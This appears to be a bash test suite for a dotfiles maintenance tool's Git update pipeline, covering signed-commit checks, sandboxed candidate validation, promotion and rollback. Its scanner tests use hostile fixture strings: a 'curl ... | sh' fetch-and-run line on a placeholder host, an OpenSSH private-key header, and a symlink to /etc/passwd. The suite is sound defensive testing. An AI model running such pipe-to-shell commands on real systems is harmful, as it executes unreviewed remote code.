#!/usr/bin/env bash
# shellcheck disable=SC2016,SC2030,SC2031  # Literal fixture code and subshell case state.
set -Eeuo pipefail

REPO_ROOT="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd -P)"
TEST_ROOT=$(mktemp -d "${TMPDIR:-/tmp}/myhypr-git-test.XXXXXXXX")
REAL_GIT=$(command -v git)
REAL_BWRAP=$(command -v bwrap || true)
TEST_BWRAP_BIN=''
TEST_BWRAP_MODE=''
TEST_TIMEOUT_BIN="$TEST_ROOT/timeout-contract.sh"
FIXTURE_SIGNING_KEY="$TEST_ROOT/maintenance-signing-key"

ssh-keygen -q -t ed25519 -N '' -f "$FIXTURE_SIGNING_KEY"

cleanup() {
    case $TEST_ROOT in
        "${TMPDIR:-/tmp}"/myhypr-git-test.*) rm -rf -- "$TEST_ROOT" ;;
    esac
}
trap cleanup EXIT

fail() {
    printf 'Maintenance Git test failed: %s\n' "$*" >&2
    exit 1
}

select_bwrap_backend() {
    local -a probe=(
        --unshare-pid
        --unshare-net
        --die-with-parent
        --ro-bind /usr /usr
        --symlink usr/bin /bin
        --symlink usr/lib /lib
        --symlink usr/lib /lib64
        --proc /proc
        --dev /dev
        --tmpfs /tmp
        --tmpfs /run
        /usr/bin/true
    )

    [[ ! ( ${MYHYPR_TEST_FORCE_CONTRACT_BWRAP:-0} == 1 && \
        ${MYHYPR_TEST_REQUIRE_REAL_BWRAP:-0} == 1 ) ]] || \
        fail 'conflicting Bubblewrap test backend requirements'
    if [[ ${MYHYPR_TEST_FORCE_CONTRACT_BWRAP:-0} != 1 && -n $REAL_BWRAP ]] && \
        "$REAL_BWRAP" "${probe[@]}" \
        >/dev/null 2>&1; then
        TEST_BWRAP_BIN=$REAL_BWRAP
        TEST_BWRAP_MODE=real
        return
    fi
    [[ ${MYHYPR_TEST_REQUIRE_REAL_BWRAP:-0} != 1 ]] || \
        fail 'the host cannot create the required Bubblewrap network namespace'
    TEST_BWRAP_BIN="$REPO_ROOT/tests/fixtures/bwrap-contract.sh"
    [[ -x $TEST_BWRAP_BIN ]] || fail 'the Bubblewrap contract fixture is unavailable'
    TEST_BWRAP_MODE=contract
}

# shellcheck source=scripts/lib.sh
source "$REPO_ROOT/scripts/lib.sh"
# shellcheck source=scripts/lib/maintenance-transaction.sh
source "$REPO_ROOT/scripts/lib/maintenance-transaction.sh"
# shellcheck source=scripts/lib/maintenance-git.sh
source "$REPO_ROOT/scripts/lib/maintenance-git.sh"

select_bwrap_backend

printf '%s\n' \
    '#!/usr/bin/env bash' \
    'set -Eeuo pipefail' \
    '[[ ${1:-} == --kill-after=5 && ${2:-} == 300 ]] || exit 64' \
    'shift 2' \
    '[[ ${MYHYPR_TEST_TIMEOUT_EXIT:-0} == 0 ]] || exit "$MYHYPR_TEST_TIMEOUT_EXIT"' \
    'exec "$@"' \
    > "$TEST_TIMEOUT_BIN"
chmod 0755 -- "$TEST_TIMEOUT_BIN"

# The command sandbox remaps host root ownership to uid 65534 inside nested
# test shells. Exercise the real fixed system binaries while overriding only
# the production owner resolver, as the snapshot-provider fixture also does.
_maintenance_git_trusted_binary() {
    case ${1:-} in
        bwrap) printf '%s\n' "$TEST_BWRAP_BIN" ;;
        env|setpriv) printf '/usr/bin/%s\n' "$1" ;;
        timeout) printf '%s\n' "$TEST_TIMEOUT_BIN" ;;
        *) return 1 ;;
    esac
}

fixture_git() {
    "$REAL_GIT" -c user.name='Maintenance Git Fixture' \
        -c user.email='fixture@example.invalid' \
        -c gpg.format=ssh \
        -c user.signingkey="$FIXTURE_SIGNING_KEY" \
        -c commit.gpgsign=true \
        "$@"
}

write_candidate_entrypoints() {
    local repository=$1

    mkdir -p -- "$repository/scripts"
    printf '%s\n' \
        '#!/usr/bin/env bash' \
        'set -Eeuo pipefail' \
        '[[ $EUID -ne 0 ]] || exit 91' \
        '[[ -z ${MYHYPR_SUDO_SESSION_READY+x} ]] || exit 92' \
        '[[ -z ${DISPLAY+x} && -z ${WAYLAND_DISPLAY+x} ]] || exit 93' \
        '[[ -z ${HYPRLAND_INSTANCE_SIGNATURE+x} && -z ${SWAYSOCK+x} ]] || exit 94' \
        'case $HOME in */candidate-environment/home) ;; *) exit 95 ;; esac' \
        'if [[ ${MYHYPR_TEST_CONTRACT_BWRAP:-0} != 1 ]]; then' \
        '    [[ ${MYHYPR_PARENT_NET_NS:-} =~ ^net:\[[0-9]+\]$ ]] || exit 102' \
        '    [[ $(readlink /proc/self/ns/net) != "$MYHYPR_PARENT_NET_NS" ]] || exit 103' \
        '    for empty_root in /home /boot /var/lib/pacman; do' \
        '        [[ -d $empty_root ]] || exit 100' \
        '        [[ -z $(find "$empty_root" -mindepth 1 -print -quit) ]] || exit 101' \
        '    done' \
        'fi' \
        'for directory in "$HOME" "$XDG_CONFIG_HOME" "$XDG_STATE_HOME" "$XDG_CACHE_HOME" "$XDG_RUNTIME_DIR"; do' \
        '    [[ $(stat -c %a -- "$directory") == 700 ]] || exit 96' \
        'done' \
        'script_root=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd -P)' \
        'if [[ ${MYHYPR_TEST_CONTRACT_BWRAP:-0} != 1 ]]; then' \
        '    [[ ! -e $script_root/../journal.json ]] || exit 97' \
        '    if git config --local myhypr.candidate-write true 2>/dev/null; then exit 98; fi' \
        'fi' \
        '[[ $(awk '\''/^NoNewPrivs:/ { print $2 }'\'' /proc/self/status) == 1 ]] || exit 99' \
        'marker_root=$HOME' \
        'marker_root+=/markers' \
        'mkdir -p -- "$marker_root"' \
        'printf "%s\n" "$*" > "$marker_root/audit"' \
        '[[ ! -e $script_root/fail-audit ]] || exit 43' \
        '[[ ${1:-} == --history && $# -eq 1 ]] || exit 64' \
        'printf "candidate audit passed\n"' \
        > "$repository/scripts/audit.sh"
    printf '%s\n' \
        '#!/usr/bin/env bash' \
        'set -Eeuo pipefail' \
        '[[ $EUID -ne 0 ]] || exit 91' \
        '[[ -z ${MYHYPR_SUDO_SESSION_READY+x} ]] || exit 92' \
        '[[ -z ${DISPLAY+x} && -z ${WAYLAND_DISPLAY+x} ]] || exit 93' \
        '[[ -z ${HYPRLAND_INSTANCE_SIGNATURE+x} && -z ${SWAYSOCK+x} ]] || exit 94' \
        'case $HOME in */candidate-environment/home) ;; *) exit 95 ;; esac' \
        'marker_root=$HOME' \
        'marker_root+=/markers' \
        'mkdir -p -- "$marker_root"' \
        'printf "%s\n" "$*" > "$marker_root/quick"' \
        'script_root=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd -P)' \
        '[[ ! -e $script_root/fail-check ]] || exit 42' \
        '[[ ${1:-} == --quick && $# -eq 1 ]] || exit 64' \
        'printf "candidate quick validation passed\n"' \
        > "$repository/scripts/check.sh"
    chmod 0755 -- "$repository/scripts/audit.sh" "$repository/scripts/check.sh"
}

setup_fixture() {
    local name=$1 policy

    CASE_ROOT="$TEST_ROOT/$name"
    ORIGIN="$CASE_ROOT/origin.git"
    AUTHOR="$CASE_ROOT/author"
    ACTIVE="$CASE_ROOT/active"
    mkdir -p -- "$CASE_ROOT"
    fixture_git init -q --bare "$ORIGIN"
    fixture_git init -q --initial-branch=main "$AUTHOR"
    write_candidate_entrypoints "$AUTHOR"
    mkdir -p -- "$AUTHOR/docs" "$AUTHOR/.config/git"
    printf 'fixture@example.invalid %s\n' \
        "$(cat "$FIXTURE_SIGNING_KEY.pub")" \
        > "$AUTHOR/.config/git/allowed_signers"
    policy='Policy: never use `cu'
    policy+='rl | sh` installers.'
    printf '%s\n' "$policy" > "$AUTHOR/docs/security-policy.md"
    printf 'current\n' > "$AUTHOR/fixture.txt"
    fixture_git -C "$AUTHOR" add -A
    fixture_git -C "$AUTHOR" commit -qm 'initial trusted revision'
    fixture_git -C "$AUTHOR" remote add origin "$ORIGIN"
    fixture_git -C "$AUTHOR" push -q -u origin main
    fixture_git -C "$ORIGIN" symbolic-ref HEAD refs/heads/main
    fixture_git clone -q "$ORIGIN" "$ACTIVE"
    CURRENT_COMMIT=$(fixture_git -C "$ACTIVE" rev-parse HEAD)

    printf 'candidate\n' > "$AUTHOR/fixture.txt"
    printf '%s\n' "$policy" 'The prohibition remains in force.' \
        > "$AUTHOR/docs/security-policy.md"
    fixture_git -C "$AUTHOR" add fixture.txt docs/security-policy.md
    fixture_git -C "$AUTHOR" commit -qm 'candidate revision'
    fixture_git -C "$AUTHOR" push -q origin main
    CANDIDATE_COMMIT=$(fixture_git -C "$AUTHOR" rev-parse HEAD)
}

begin_transaction() {
    local root=$1 current=$2

    HOME="$root/home"
    XDG_STATE_HOME="$root/state"
    XDG_RUNTIME_DIR="$root/run"
    export HOME XDG_STATE_HOME XDG_RUNTIME_DIR
    mkdir -p -- "$HOME" "$XDG_STATE_HOME" "$XDG_RUNTIME_DIR"
    chmod 0700 -- "$HOME" "$XDG_STATE_HOME" "$XDG_RUNTIME_DIR"
    maintenance_paths_init || fail 'maintenance paths could not be initialized'
    maintenance_lock_acquire || fail 'maintenance lock could not be acquired'
    maintenance_tx_begin dotfiles desktop "$current" '' || \
        fail 'maintenance transaction could not be started'
    TX_DIR=$MYHYPR_TRANSACTION_DIR
}

assert_head() {
    local repository=$1 expected=$2 message=$3
    local actual

    actual=$(fixture_git -C "$repository" rev-parse HEAD)
    [[ $actual == "$expected" ]] || fail "$message"
}

assert_no_candidate_execution() {
    local tx_dir=$1
    local marker_root="$tx_dir/candidate-environment/home"

    marker_root+=/markers
    [[ ! -e $marker_root/audit ]] || \
        fail 'trusted rejection ran the candidate audit'
    [[ ! -e $marker_root/quick ]] || \
        fail 'trusted rejection ran candidate quick validation'
}

add_candidate_file() {
    local path=$1 content=$2 requested_mode=${3:-}

    mkdir -p -- "$(dirname -- "$AUTHOR/$path")"
    printf '%s\n' "$content" > "$AUTHOR/$path"
    if [[ -n $requested_mode ]]; then
        chmod "$requested_mode" -- "$AUTHOR/$path"
    fi
    fixture_git -C "$AUTHOR" add -- "$path"
    fixture_git -C "$AUTHOR" commit -qm "add $path"
    fixture_git -C "$AUTHOR" push -q origin main
    CANDIDATE_COMMIT=$(fixture_git -C "$AUTHOR" rev-parse HEAD)
}

reset_transaction_context() {
    _maintenance_close_lock_fd
    unset MYHYPR_TRANSACTION_DIR MAINTENANCE_STATE_ROOT
    unset MAINTENANCE_RUNTIME_ROOT MAINTENANCE_TX_ROOT
    unset DISPLAY WAYLAND_DISPLAY HYPRLAND_INSTANCE_SIGNATURE SWAYSOCK
    unset MYHYPR_SUDO_SESSION_READY
}

run_success_lifecycle() {
    reset_transaction_context
    setup_fixture success
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    export DISPLAY=:99 WAYLAND_DISPLAY=wayland-fixture
    export HYPRLAND_INSTANCE_SIGNATURE=fixture SWAYSOCK="$CASE_ROOT/sway.sock"
    export MYHYPR_SUDO_SESSION_READY=1

    prepare_log="$CASE_ROOT/prepare.log"
    if ! maintenance_git_prepare "$TX_DIR" "$ACTIVE" >"$prepare_log" 2>&1; then
        command cat -- "$prepare_log" >&2
        fail 'a clean fast-forward candidate was rejected'
    fi
    if rg -Fq 'circular name reference' "$prepare_log"; then
        fail 'candidate sandbox setup emitted a circular nameref warning'
    fi
    assert_head "$ACTIVE" "$CURRENT_COMMIT" 'preparation moved the active checkout'
    assert_head "$TX_DIR/candidate" "$CANDIDATE_COMMIT" \
        'the detached candidate worktree has the wrong object'
    [[ -z $(fixture_git -C "$TX_DIR/candidate" branch --show-current) ]] || \
        fail 'the candidate worktree is not detached'
    [[ $(stat -c %a -- "$TX_DIR/git.json") == 600 ]] || \
        fail 'Git evidence is not private'
    jq -e --arg id "${TX_DIR##*/}" --arg candidate "$CANDIDATE_COMMIT" '
        .version == 1 and .transaction_id == $id and
        .candidate_commit == $candidate and
        .checks == {trusted_scan: 0, audit: 0, quick: 0} and
        (keys | sort) == (["candidate_commit","checks","transaction_id","version"] | sort)
    ' "$TX_DIR/git.json" >/dev/null || fail 'Git preparation evidence is unbounded or incorrect'
    jq -e --arg candidate "$CANDIDATE_COMMIT" \
        '.candidate_commit == $candidate' "$TX_DIR/journal.json" >/dev/null || \
        fail 'the journal did not record the fetched candidate object'
    marker_root="$TX_DIR/candidate-environment/home"
    marker_root+=/markers
    [[ $(<"$marker_root/audit") == --history ]] || \
        fail 'candidate audit did not receive the publication-audit argument'
    [[ $(<"$marker_root/quick") == --quick ]] || \
        fail 'candidate validation did not receive the quick argument'

    maintenance_git_promote "$TX_DIR" "$ACTIVE" || \
        fail 'the validated fast-forward candidate could not be promoted'
    assert_head "$ACTIVE" "$CANDIDATE_COMMIT" 'promotion did not select the validated object'
    maintenance_git_restore_previous "$TX_DIR" "$ACTIVE" || \
        fail 'the owned candidate could not be restored to its previous object'
    assert_head "$ACTIVE" "$CURRENT_COMMIT" 'restore did not select the recorded previous object'

    mkdir -p -- "$TX_DIR/keep"
    printf 'retain\n' > "$TX_DIR/keep/evidence"
    maintenance_git_cleanup "$TX_DIR" "$ACTIVE" || \
        fail 'transaction-owned candidate cleanup failed'
    [[ ! -e $TX_DIR/candidate ]] || fail 'candidate worktree remains after cleanup'
    [[ $(<"$TX_DIR/keep/evidence") == retain ]] || \
        fail 'candidate cleanup removed unrelated transaction evidence'
}

run_dirty_rejected_before_fetch() {
    reset_transaction_context
    setup_fixture dirty
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    before_upstream=$(fixture_git -C "$ACTIVE" rev-parse '@{upstream}')
    printf 'local edit\n' > "$ACTIVE/fixture.txt"
    if maintenance_git_prepare "$TX_DIR" "$ACTIVE"; then
        fail 'a dirty active worktree was accepted'
    fi
    after_upstream=$(fixture_git -C "$ACTIVE" rev-parse '@{upstream}')
    [[ $before_upstream == "$CURRENT_COMMIT" && $after_upstream == "$CURRENT_COMMIT" ]] || \
        fail 'dirty rejection did not happen before fetch'
    [[ ! -e $TX_DIR/candidate ]] || fail 'dirty rejection created a candidate worktree'
    assert_head "$ACTIVE" "$CURRENT_COMMIT" 'dirty rejection changed active HEAD'
}

run_missing_upstream_rejected() {
    reset_transaction_context
    setup_fixture missing-upstream
    fixture_git -C "$ACTIVE" branch --unset-upstream
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    if maintenance_git_prepare "$TX_DIR" "$ACTIVE"; then
        fail 'a repository without an upstream was accepted'
    fi
    [[ ! -e $TX_DIR/candidate ]] || fail 'missing-upstream rejection left a candidate worktree'
    assert_head "$ACTIVE" "$CURRENT_COMMIT" 'missing-upstream rejection changed active HEAD'
}

run_diverged_rejected() {
    reset_transaction_context
    setup_fixture diverged
    printf 'local-only\n' > "$ACTIVE/local.txt"
    fixture_git -C "$ACTIVE" add local.txt
    fixture_git -C "$ACTIVE" commit -qm 'local divergence'
    local_commit=$(fixture_git -C "$ACTIVE" rev-parse HEAD)
    begin_transaction "$CASE_ROOT" "$local_commit"
    if maintenance_git_prepare "$TX_DIR" "$ACTIVE"; then
        fail 'a non-fast-forward upstream was accepted'
    fi
    [[ ! -e $TX_DIR/candidate ]] || fail 'divergence rejection left a candidate worktree'
    assert_head "$ACTIVE" "$local_commit" 'divergence rejection changed active HEAD'
}

run_candidate_failure() {
    local failure_kind=$1 expected_audit=$2 expected_quick=$3

    reset_transaction_context
    setup_fixture "$failure_kind"
    : > "$AUTHOR/$failure_kind"
    fixture_git -C "$AUTHOR" add "$failure_kind"
    fixture_git -C "$AUTHOR" commit -qm "trigger $failure_kind"
    fixture_git -C "$AUTHOR" push -q origin main
    CANDIDATE_COMMIT=$(fixture_git -C "$AUTHOR" rev-parse HEAD)
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    if maintenance_git_prepare "$TX_DIR" "$ACTIVE"; then
        fail "$failure_kind candidate was accepted"
    fi
    assert_head "$ACTIVE" "$CURRENT_COMMIT" "$failure_kind validation changed active HEAD"
    jq -e --arg candidate "$CANDIDATE_COMMIT" \
        --argjson audit "$expected_audit" --argjson quick "$expected_quick" '
        .candidate_commit == $candidate and .checks.trusted_scan == 0 and
        .checks.audit == $audit and .checks.quick == $quick
    ' "$TX_DIR/git.json" >/dev/null || fail "$failure_kind statuses were not recorded"
    marker_root="$TX_DIR/candidate-environment/home"
    marker_root+=/markers
    [[ -e $marker_root/audit ]] || \
        fail "$failure_kind did not exercise candidate audit"
    if [[ $expected_quick == null ]]; then
        [[ ! -e $marker_root/quick ]] || \
            fail 'quick validation ran after candidate audit failed'
    else
        [[ -e $marker_root/quick ]] || \
            fail 'candidate quick validation did not run'
    fi
}

run_candidate_timeout() {
    reset_transaction_context
    setup_fixture candidate-timeout
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    export MYHYPR_TEST_TIMEOUT_EXIT=124
    if maintenance_git_prepare "$TX_DIR" "$ACTIVE"; then
        unset MYHYPR_TEST_TIMEOUT_EXIT
        fail 'a timed-out candidate audit was accepted'
    fi
    unset MYHYPR_TEST_TIMEOUT_EXIT
    assert_head "$ACTIVE" "$CURRENT_COMMIT" \
        'candidate timeout changed active HEAD'
    jq -e --arg candidate "$CANDIDATE_COMMIT" '
        .candidate_commit == $candidate and .checks.trusted_scan == 0 and
        .checks.audit == 124 and .checks.quick == null
    ' "$TX_DIR/git.json" >/dev/null || \
        fail 'candidate timeout status was not recorded'
    assert_no_candidate_execution "$TX_DIR"
}

run_unsigned_candidate_rejected() {
    reset_transaction_context
    setup_fixture unsigned-candidate
    printf 'unsigned candidate\n' > "$AUTHOR/unsigned.txt"
    fixture_git -C "$AUTHOR" add unsigned.txt
    fixture_git -c commit.gpgsign=false -C "$AUTHOR" \
        commit -qm 'unsigned candidate revision'
    fixture_git -C "$AUTHOR" push -q origin main
    CANDIDATE_COMMIT=$(fixture_git -C "$AUTHOR" rev-parse HEAD)
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"

    if maintenance_git_prepare "$TX_DIR" "$ACTIVE" >/dev/null 2>&1; then
        fail 'an unsigned incoming candidate was accepted'
    fi
    assert_no_candidate_execution "$TX_DIR"
    assert_head "$ACTIVE" "$CURRENT_COMMIT" \
        'unsigned candidate rejection changed active HEAD'
}

run_scan_rejection() {
    local class=$1 path=$2 content=$3 requested_mode=${4:-}

    reset_transaction_context
    setup_fixture "scan-$class"
    add_candidate_file "$path" "$content" "$requested_mode"
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    scan_log="$CASE_ROOT/scan.log"
    if maintenance_git_prepare "$TX_DIR" "$ACTIVE" >"$scan_log" 2>&1; then
        fail "$class trusted-scan fixture was accepted"
    fi
    assert_head "$ACTIVE" "$CURRENT_COMMIT" "$class rejection changed active HEAD"
    assert_no_candidate_execution "$TX_DIR"
    jq -e --arg candidate "$CANDIDATE_COMMIT" '
        .candidate_commit == $candidate and .checks.trusted_scan != 0 and
        .checks.audit == null and .checks.quick == null
    ' "$TX_DIR/git.json" >/dev/null || fail "$class rejection evidence is incorrect"
    if rg -Fq -- "$content" "$scan_log"; then
        fail "$class rejection disclosed matched candidate content"
    fi
}

run_large_file_rejection() {
    reset_transaction_context
    setup_fixture scan-large
    truncate -s $((10 * 1024 * 1024 + 1)) "$AUTHOR/unreviewed.bin"
    fixture_git -C "$AUTHOR" add unreviewed.bin
    fixture_git -C "$AUTHOR" commit -qm 'add unreviewed large file'
    fixture_git -C "$AUTHOR" push -q origin main
    CANDIDATE_COMMIT=$(fixture_git -C "$AUTHOR" rev-parse HEAD)
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    if maintenance_git_prepare "$TX_DIR" "$ACTIVE" >/dev/null 2>&1; then
        fail 'an unreviewed large candidate file was accepted'
    fi
    assert_no_candidate_execution "$TX_DIR"
    assert_head "$ACTIVE" "$CURRENT_COMMIT" 'large-file rejection changed active HEAD'
}

run_ifs_preserved() {
    reset_transaction_context
    setup_fixture caller-ifs
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    IFS=:
    if ! maintenance_git_prepare "$TX_DIR" "$ACTIVE"; then
        unset IFS
        fail 'candidate preparation depended on the caller IFS'
    fi
    [[ $IFS == : ]] || fail 'candidate preparation modified the caller IFS'
    unset IFS
}

run_symlink_rejection() {
    reset_transaction_context
    setup_fixture scan-symlink
    ln -s -- /etc/passwd "$AUTHOR/external-link"
    fixture_git -C "$AUTHOR" add external-link
    fixture_git -C "$AUTHOR" commit -qm 'add unsafe external symlink'
    fixture_git -C "$AUTHOR" push -q origin main
    CANDIDATE_COMMIT=$(fixture_git -C "$AUTHOR" rev-parse HEAD)
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    if maintenance_git_prepare "$TX_DIR" "$ACTIVE" >/dev/null 2>&1; then
        fail 'an absolute candidate symlink was accepted'
    fi
    assert_no_candidate_execution "$TX_DIR"
    assert_head "$ACTIVE" "$CURRENT_COMMIT" 'symlink rejection changed active HEAD'
}

run_scanner_dependency_failure() {
    reset_transaction_context
    setup_fixture scanner-dependency
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    fake_bin="$CASE_ROOT/fake-bin"
    scanner_log="$CASE_ROOT/scanner-rg.log"
    mkdir -p -- "$fake_bin"
    printf '%s\n' \
        '#!/usr/bin/env bash' \
        'set -Eeuo pipefail' \
        'printf "%s\n" "$*" >> "$SCANNER_RG_LOG"' \
        'for argument in "$@"; do' \
        '    if [[ $argument == *client*secret* ]]; then' \
        '        exit 70' \
        '    fi' \
        'done' \
        'exec /usr/bin/rg "$@"' \
        > "$fake_bin/rg"
    chmod 0755 -- "$fake_bin/rg"
    export SCANNER_RG_LOG="$scanner_log"
    if PATH="$fake_bin:/usr/bin:/bin" \
        maintenance_git_prepare "$TX_DIR" "$ACTIVE" >/dev/null 2>&1; then
        fail 'a trusted scanner dependency failure was accepted as a clean result'
    fi
    assert_no_candidate_execution "$TX_DIR"
    rg -Fq 'client' "$scanner_log" || fail 'the scanner error branch was not exercised'
    jq -e '.checks.trusted_scan == 74 and .checks.audit == null and
        .checks.quick == null' "$TX_DIR/git.json" >/dev/null || \
        fail 'scanner dependency failure evidence is incorrect'
    unset SCANNER_RG_LOG
}

run_promotion_recheck() {
    local mode=$1

    reset_transaction_context
    setup_fixture "promote-$mode"
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    maintenance_git_prepare "$TX_DIR" "$ACTIVE" || fail "$mode preparation failed"
    case $mode in
        dirty)
            printf 'uncommitted collision\n' > "$ACTIVE/fixture.txt"
            ;;
        head)
            printf 'local head\n' > "$ACTIVE/local-head.txt"
            fixture_git -C "$ACTIVE" add local-head.txt
            fixture_git -C "$ACTIVE" commit -qm 'move active head'
            ;;
        upstream)
            printf 'new remote\n' > "$AUTHOR/after-prepare.txt"
            fixture_git -C "$AUTHOR" add after-prepare.txt
            fixture_git -C "$AUTHOR" commit -qm 'advance after preparation'
            fixture_git -C "$AUTHOR" push -q origin main
            fixture_git -C "$ACTIVE" fetch -q --prune --no-tags
            ;;
        *) fail "unknown promotion recheck mode: $mode" ;;
    esac
    before=$(fixture_git -C "$ACTIVE" rev-parse HEAD)
    if maintenance_git_promote "$TX_DIR" "$ACTIVE"; then
        fail "promotion ignored changed $mode state"
    fi
    assert_head "$ACTIVE" "$before" "failed $mode promotion changed active HEAD"
}

run_restore_collision() {
    reset_transaction_context
    setup_fixture restore-collision
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    maintenance_git_prepare "$TX_DIR" "$ACTIVE" || fail 'restore fixture preparation failed'
    maintenance_git_promote "$TX_DIR" "$ACTIVE" || fail 'restore fixture promotion failed'
    printf 'local collision\n' > "$ACTIVE/fixture.txt"
    if maintenance_git_restore_previous "$TX_DIR" "$ACTIVE"; then
        fail 'restore overwrote a local collision'
    fi
    assert_head "$ACTIVE" "$CANDIDATE_COMMIT" 'failed restore changed active HEAD'
    [[ $(<"$ACTIVE/fixture.txt") == 'local collision' ]] || \
        fail 'failed restore changed the colliding local file'
}

run_restore_head_ownership() {
    reset_transaction_context
    setup_fixture restore-head
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    maintenance_git_prepare "$TX_DIR" "$ACTIVE" || fail 'restore ownership preparation failed'
    maintenance_git_promote "$TX_DIR" "$ACTIVE" || fail 'restore ownership promotion failed'
    printf 'new owner\n' > "$ACTIVE/new-owner.txt"
    fixture_git -C "$ACTIVE" add new-owner.txt
    fixture_git -C "$ACTIVE" commit -qm 'move beyond owned candidate'
    unexpected=$(fixture_git -C "$ACTIVE" rev-parse HEAD)
    if maintenance_git_restore_previous "$TX_DIR" "$ACTIVE"; then
        fail 'restore accepted an active HEAD no longer owned by the transaction'
    fi
    assert_head "$ACTIVE" "$unexpected" 'ownership rejection changed active HEAD'
}

run_cleanup_containment() {
    reset_transaction_context
    setup_fixture cleanup-containment
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    maintenance_git_prepare "$TX_DIR" "$ACTIVE" || fail 'cleanup fixture preparation failed'
    maintenance_git_cleanup "$TX_DIR" "$ACTIVE" || fail 'initial candidate cleanup failed'
    outside="$CASE_ROOT/outside"
    mkdir -p -- "$outside"
    printf 'outside\n' > "$outside/evidence"
    ln -s -- "$outside" "$TX_DIR/candidate"
    if maintenance_git_cleanup "$TX_DIR" "$ACTIVE"; then
        fail 'cleanup accepted a symlink candidate path'
    fi
    [[ $(<"$outside/evidence") == outside ]] || fail 'cleanup modified an external path'
}

run_cleanup_missing_path() {
    reset_transaction_context
    setup_fixture cleanup-missing
    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
    maintenance_git_prepare "$TX_DIR" "$ACTIVE" || fail 'missing cleanup fixture failed'
    candidate_path="$TX_DIR/candidate"
    before=$(fixture_git -C "$ACTIVE" worktree list --porcelain)
    [[ $before == *"worktree $candidate_path"* ]] || \
        fail 'candidate worktree was not registered before deletion'
    case $candidate_path in
        "$TX_DIR"/candidate) rm -rf -- "$candidate_path" ;;
        *) fail 'refusing unsafe missing-worktree fixture cleanup' ;;
    esac
    maintenance_git_cleanup "$TX_DIR" "$ACTIVE" || \
        fail 'cleanup could not reconcile a missing transaction worktree'
    after=$(fixture_git -C "$ACTIVE" worktree list --porcelain)
    [[ $after != *"worktree $candidate_path"* ]] || \
        fail 'cleanup left a stale transaction worktree registration'
}

run_lockless_rejected() {
    reset_transaction_context
    setup_fixture lockless
    HOME="$CASE_ROOT/home"
    XDG_STATE_HOME="$CASE_ROOT/state"
    XDG_RUNTIME_DIR="$CASE_ROOT/run"
    export HOME XDG_STATE_HOME XDG_RUNTIME_DIR
    mkdir -p -- "$HOME" "$XDG_STATE_HOME" "$XDG_RUNTIME_DIR"
    chmod 0700 -- "$HOME" "$XDG_STATE_HOME" "$XDG_RUNTIME_DIR"
    maintenance_paths_init
    maintenance_lock_acquire
    maintenance_tx_begin dotfiles desktop "$CURRENT_COMMIT" ''
    TX_DIR=$MYHYPR_TRANSACTION_DIR
    _maintenance_close_lock_fd
    if maintenance_git_prepare "$TX_DIR" "$ACTIVE"; then
        fail 'Git preparation ran without the transaction lock'
    fi
    [[ ! -e $TX_DIR/candidate ]] || fail 'lockless preparation created a candidate worktree'
}

run_success_lifecycle
run_dirty_rejected_before_fetch
run_missing_upstream_rejected
run_diverged_rejected
run_candidate_failure fail-audit 43 null
run_candidate_failure fail-check 0 42
run_candidate_timeout
run_unsigned_candidate_rejected

unsafe_bootstrap='curl https://example.invalid/bootstrap'
unsafe_bootstrap+=' | sh'
private_home='/home/'
private_home+='candidate-fixture-user/.config/private'
legacy_fetch='git clone https://github.com/'
legacy_fetch+='mylinuxforwork/dotfiles'
private_key='BEGIN OPENSSH PRIVATE'
private_key+=' KEY'
run_scan_rejection unsafe-bootstrap bootstrap.sh "$unsafe_bootstrap"
run_scan_rejection executable-document docs/installer.md "$unsafe_bootstrap" 0755
run_scan_rejection sensitive-filename .env 'private fixture value'
run_scan_rejection secret-content private.txt "$private_key"
run_scan_rejection secret-document docs/private.md "$private_key"
run_scan_rejection private-home machine.conf "$private_home"
run_scan_rejection active-legacy-fetch legacy.sh "$legacy_fetch"
run_large_file_rejection
run_ifs_preserved
run_symlink_rejection
run_scanner_dependency_failure

run_promotion_recheck dirty
run_promotion_recheck head
run_promotion_recheck upstream
run_restore_collision
run_restore_head_ownership
run_cleanup_containment
run_cleanup_missing_path
run_lockless_rejected

printf 'Maintenance Git candidates are isolated, validated, and collision-safe (%s backend).\n' \
    "$TEST_BWRAP_MODE"
